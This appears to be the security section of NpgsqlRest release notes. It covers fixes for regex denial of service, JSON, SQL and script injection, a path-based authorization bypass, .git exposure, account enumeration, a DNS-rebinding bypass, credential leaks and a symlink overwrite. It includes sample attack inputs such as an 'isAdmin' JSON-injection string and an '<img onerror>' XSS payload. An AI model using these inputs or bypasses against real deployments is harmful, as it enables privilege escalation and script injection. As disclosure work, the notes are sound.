**What was wrong.** The built-in `email` pattern (`^[^@\s]+@[^@\s]+\.[^@\s]+$`) slows down quadratically on input such as `a@` followed by many dots and a space. A 40 KB value took 0.7 seconds of CPU, and a 400 KB value in a JSON body over a minute. Each such request kept a CPU core busy, and there was no time limit. Custom `Regex` rules had the same exposure, depending on their pattern.

**What changed.**
- Each rule's pattern is compiled once and run with .NET's non-backtracking engine, which always takes linear time. The 400 KB example now takes milliseconds. Results are unchanged; validation only checks whether the value matches.
- Patterns the linear engine cannot run (backreferences such as `\1`, lookarounds) use the regular engine, with a 250 ms time limit per check.
- A value that hits the limit fails validation, and a warning is logged.

#### Enum and domain columns: invalid JSON and JSON injection

**Severity: Medium.** Applies to functions and queries that return columns of an **enum** type or a **domain** type.

**What was wrong.** NpgsqlRest has no specific mapping for enum and domain types, and it wrote their text into JSON responses unquoted:
- An enum value produced invalid JSON: `{"mood":happy}`.
- A domain over `text` let stored data inject JSON keys. A value such as `x","isAdmin":true,"y":"z` turned into an extra `isAdmin` property.
- An empty value failed with HTTP `500` ("Index was outside the bounds of the array").

**What changed.** These values are now written as properly escaped JSON strings: `{"mood":"happy"}`, and the domain value above stays one string, `"x\",\"isAdmin\":true,\"y\":\"z"`. An empty value becomes `""`.

#### Static files: protected pages reachable through path variants, `.git` served, unbounded memory

**Severity: Medium.** Applies to the `npgsqlrest` client serving static files (the `StaticFiles` section).

**What was wrong.**
- **`AuthorizePaths` could be bypassed.** The rules were matched against the raw request path, while the file itself was found through a normalized path. A request for `//protected/page.html` did not match the rule `/protected/*`, yet still served `/protected/page.html` to anonymous users. The same applied to `///…` and other variants, and to `\` on Windows.
- **Files inside dot-directories were served.** Dotfiles such as `.env` were already excluded, but a file *inside* a dot-directory was not: if the web root contained a `.git` folder, `/.git/config` (which can contain credentials) and the whole repository history could be downloaded.
- **Memory grew without limit.** Small per-path caches, and the cache of parsed HTML templates (`CacheParsedFile`), were keyed by the raw request path. Every `//` or case variant of an existing file added another entry, and parsed HTML files were stored again in full each time.

**What changed.**
- `AuthorizePaths` and `ParsePatterns` are matched against the canonical path of the file actually served (its path relative to the web root), so every variant is protected the same way.
- Paths with a segment starting with `.` are no longer served. The exception is `/.well-known/`, which is used for ACME challenges and `security.txt`.
- The per-path pattern caches are removed (the matching is cheap). The parsed-template cache is keyed by the physical file and limited to 1,000 entries.

#### Claim values in parsed static HTML could inject script

**Severity: Medium.** Applies to static file parsing (`StaticFiles:ParseContentOptions`) with claims or environment variables templated into HTML pages, such as `{user_name}`.

**What was wrong.** Values were JSON-escaped with the "relaxed" encoder, which leaves `<`, `>` and `&` as they are. Claim values often come from data a user controls, such as a display name returned by the login function or an OAuth profile name. A value like `</script><img src=x onerror=alert(1)>` closed the surrounding `<script>` block, or injected markup into HTML text, and ran script in every page that showed it.

**What changed.** Templated values now escape HTML-sensitive characters (`<` `>` `&` `'` `"` `+`) as `\uXXXX`. They are still complete JSON and JavaScript string literals, used the same way as before, and other Unicode text such as `José` is unchanged. The only visible difference is that a quote inside a value now appears as `"` instead of `\"`; both are equivalent in JavaScript and JSON.

#### Breaking: a wrong password now answers like an unknown user (401)

**Severity: Low.** Applies to `login` endpoints that verify passwords (the login routine returns the `hash` column).

**What was wrong.** A wrong password answered `404 Not Found`, while an unknown user (the routine returned no row) answered `401 Unauthorized`. The status code alone told anyone which accounts exist. Response time told the same story: only an existing account ran the password hash check, which is deliberately slow.

**What changed.**
- A failed password check now answers `401` with the same body as an unknown user: `{"title":"Unauthorized","status":401}`. As in 3.22.0's earlier login fix, this covers a stored hash of NULL, a missing password, and a missing hasher.
- When no row comes back but the result has the hash column, NpgsqlRest verifies the attempted password against a throwaway hash, so both cases cost the same work.
- `PasswordVerificationFailedCommand` still runs only for real accounts.

**Do you need to do anything?** Only if a client checks for `404` to detect a wrong password; it should check for `401`.

#### Authorization is now checked before the request is processed

**Severity: Low.** Applies to endpoints with `authorize` (with or without roles).

**What was wrong.** The sign-in and role check ran only after all parameter processing. An anonymous caller of a protected endpoint therefore:
- made the server read and parse the request body, run password hashing for `hash` parameters (deliberately slow, so cheap to abuse), run validation and `encrypt` for every request before receiving 401;
- could learn the endpoint's parameter rules from responses meant for signed-in callers: validation errors (400), `204` from a `strict` function given a NULL, `404` for an unknown parameter name.

**What changed.** Authorization is decided before any of that work, right after Basic Auth:
- Anonymous callers get `401`, and signed-in callers without a required role get `403`, before the body is read.
- For overloaded routines (one path, different parameter counts), the upfront check only applies when every overload requires sign-in, so a public overload stays public. The check after parameter processing still runs for the overload the request resolves to.

Signed-in callers see no difference.

#### Infrastructure error details are no longer returned to clients

**Severity: Low.**

**What was wrong.** When a request failed for a reason other than a PostgreSQL error, the error message went back to the client. For a connection failure that read like `Failed to connect to 10.0.4.17:5432`, put in the response `title`; for other unexpected errors, .NET exception text was put in `detail`. Both reveal internal hosts, ports and implementation details.

**What changed.** Those responses are now a plain `500 Internal Server Error`, and the full error is in the server log, as before. Errors raised by PostgreSQL itself (`raise exception`, constraint violations and so on) still return their message and SQLSTATE, because routines use them to report errors to clients. Error-code mapping (`ErrorHandlingOptions`) is unchanged.

#### MCP: the DNS-rebinding check could be bypassed

**Severity: Low.** Applies to `NpgsqlRest.Mcp`, mainly to MCP servers reachable only locally or on an internal network.

**What was wrong.** A browser request carrying an `Origin` header is accepted when the origin is in `AllowedOrigins` or is "the server's own origin". The server's own origin was built from the request's `Host` header. In a DNS-rebinding attack, a web page on the attacker's domain is made to resolve to your local server, so `Origin` and `Host` both carry the attacker's domain and always matched. Any website a user visited could call the local MCP server's tools.

**What changed.** A matching `Host` now counts as same-origin only for host names an attacker can't serve a page from: `localhost` (and `*.localhost`), IP addresses, and the host names the server itself is bound to (`Urls`). Requests without an `Origin` header, which is how desktop and IDE MCP clients connect, are unaffected.

**Do you need to do anything?** Only if a browser page served under a DNS name calls the MCP endpoint of the same site, such as `https://app.example.com` calling `https://app.example.com/mcp`. Add that origin to `McpOptions.AllowedOrigins`.

#### OpenAPI published the routines' annotations, including credentials

**Severity: Low.** Applies to `NpgsqlRest.OpenApi`.

**What was wrong.** An operation's `summary` and `description` were the routine's raw comment: every annotation line along with the prose. That exposed `basic_auth <user> <password>` credentials, `challenge_command` and `row_command` SQL, proxy hosts, connection names and any other `key = value` setting, in a document that is usually public.

**What changed.** `summary` and `description` are now built only from the comment's prose: lines that are not annotations. That's the same text the MCP plugin uses for tool descriptions. An operation whose comment has no prose gets the default summary (`FUNCTION schema.name`).

The generated HTTP files and TypeScript/Dart clients still include the routine's comment, and with `CommentHeader: Full` its whole definition, because they are meant to mirror the source. Don't publish those files, and prefer `Auth:BasicAuth` configuration over passwords in `basic_auth` annotations.

#### Passwords and request bodies in logs

**Severity: Low.**

**What was wrong.**
- `ObfuscateAuthParameterLogValues` (default `true`) hides parameter values of login and auth endpoints in the command log. The Trace-level log of the login command, and of the Basic Auth challenge command that runs through it, still printed every parameter value, including the password in clear text.
- A request body that wasn't valid JSON was written to the log in full, as a warning. That included a login whose JSON had a typo (with its password), and a body of any size the client chose to send.

**What changed.**
- Those Trace entries now show `***` for parameter values when `ObfuscateAuthParameterLogValues` is on.
- The invalid-JSON warning logs the body's length and the parser error, not the body.

#### `SerializeAuthEndpointsResponse` returned the password hash

**Severity: Low.** Applies only when `NpgsqlRest:AuthenticationOptions:SerializeAuthEndpointsResponse` is `true` (default `false`), for cookie logins whose routine returns no `body` column.

**What was wrong.** With this option, a successful login responds with the login routine's record. That record includes the password hash column (`HashColumnName`, default `hash`), which the routine must return so NpgsqlRest can verify the password, so the hash was sent to the client.

**What changed.** In that response the hash column is now `null`; all other columns are returned as before.

#### Breaking: no placeholder substitution in upload `row_command`

**Severity: Low.** Applies to CSV and Excel upload endpoints whose `row_command` annotation contains a `{placeholder}`.

**What was wrong.** Custom parameters (`key = value` annotations) replace `{name}` with the request's parameter value. That includes `row_command`, which is SQL text the upload handler executes for every row. `row_command = call save_row($1, $2, '{_tag}')` therefore pasted the caller's `tag` value into SQL: SQL injection.

**What changed.** Placeholders are no longer substituted in `row_command`, or in the handler-prefixed forms `csv_row_command` and `excel_row_command`. The text is executed exactly as written. At startup, a warning names any `row_command` that contains a placeholder.

**Do you need to do anything?** Only if a `row_command` uses a placeholder. Per-request values can't go into the row command's SQL text. Use the parameters it already receives (`$1` row index, `$2` row values, `$3` previous result, `$4` metadata JSON including user claims), or post-process the uploaded rows in the endpoint's own function, which runs after the upload with all request parameters.

#### Excel downloads: a request value could rename the downloaded file

**Severity: Low.** Applies to `table_format = excel` endpoints whose `excel_file_name` contains a `{placeholder}` filled from the request.

**What was wrong.** The `Content-Disposition` header was assembled as text: `attachment; filename="<name>.xlsx"`. A `"` in the request value ended the quoted name. The caller could then append their own `filename*=` parameter, which browsers prefer, and make a download from your site save as, for example, `evil.html`. A line break in the value failed the response.

**What changed.** The header is built with ASP.NET Core's `ContentDispositionHeaderValue`. Quotes, path separators and control characters in the name are replaced with `_`, and non-ASCII names are sent correctly encoded in `filename*`.

#### Generated TypeScript and Dart clients: routine comments could break out of doc comments

**Severity: Low.** Applies to `NpgsqlRest.TsClient` and `NpgsqlRest.DartClient` output.

**What was wrong.**
- TypeScript: routine comments and definitions are copied into a `/** ... */` doc block. A `*/` in them ended the block early, and the rest of the line became TypeScript code in the generated client. With `CommentHeader: Full`, the routine body is included, and a `/* ... */` comment in it is enough. Usually the result was a client that didn't compile; with a crafted comment, it was code that ran in your front end.
- Dart: comment lines are prefixed with `///`, but lines were split only at `\n`. Dart also ends a line at a lone `\r`, so text after one ended up outside the comment.

**What changed.** TypeScript doc text writes `*/` as `*\/`. In Dart, every line, including those ending at a lone `\r`, starts with `///`. Generated code is otherwise unchanged.

#### `--install-skill` no longer writes through symbolic links

**Severity: Low.** Applies to `npgsqlrest --install-skill` (added in 3.21.0).

**What was wrong.** The installer writes the skill files into `.claude/skills/npgsqlrest/` of the current project and follows symbolic links when doing so. A cloned repository could ship that folder, or `SKILL.md` inside it, as a link to one of your own files, for example `~/.bashrc`. Running `--install-skill` in that repository would have overwritten it.

**What changed.** If the `npgsqlrest` skill folder or any of the files to be written is a symbolic link, the installer stops before writing anything and names the link. `.claude` and `.claude/skills` may still be links, as dotfile managers commonly link `~/.claude`.

#### New startup warnings for risky configurations

**Severity: Low.** Nothing changes at runtime; NpgsqlRest now warns at startup about settings that quietly expose or weaken something:
- **Stats endpoints without authorization.** `Stats:Enabled` without `Stats:RequireAuthorization` or `Stats:AuthorizedRoles` lets anyone read database statistics. That includes `/stats/activity`, which lists other sessions' current query texts, database users and client addresses.
- **`encrypt` without Data Protection.** Without a configured data protector, the `encrypt` annotation does nothing, and the values are stored as plain text. The warning names each affected routine.

### Fixes

#### Command timeouts of one minute or more were silently ignored

A command timeout, set by `NpgsqlRest:CommandTimeout` or the `timeout` annotation, was converted to seconds using only the *seconds part* of the interval:
- `"1 minute"`, `"2 minutes"` or `"1 hour"` became `0`, which Npgsql treats as **no timeout at all**;
- `"90 seconds"` became `30`.

A timeout meant to stop runaway queries did nothing. Timeouts now use the full duration, rounded up to whole seconds, so a sub-second timeout no longer turns into "unlimited" either. An explicit `0` still means no timeout.

#### `Auth:LogoutPath` did not work, and could create a login endpoint

`Auth:LogoutPath` is documented as a URL path, like `Auth:LoginPath`. The client instead compared it with the **routine name** and marked the matching endpoint as a **login** endpoint:
- Set to a URL as documented, it never matched anything, so that endpoint never signed anyone out, and sessions survived "logout".
- Set to the routine name, it turned the logout routine into an anonymous **login** endpoint, and whatever row it returned became a signed-in user.

`LogoutPath` now matches the endpoint path and marks it as a logout endpoint. Endpoints marked with the `logout` annotation were not affected.

---

#### Text arrays with an element ending in a backslash were returned wrong

A `text[]` (or `varchar[]`, ...) value with an element that ends in a backslash, such as `array['a\', 'b']`, came back with its elements merged and shifted (`["a\\\",b", ...]`). PostgreSQL sends that element as `"a\\"`; the converter took its closing quote for an escaped quote. Such arrays are now returned correctly: `["a\\","b"]`.
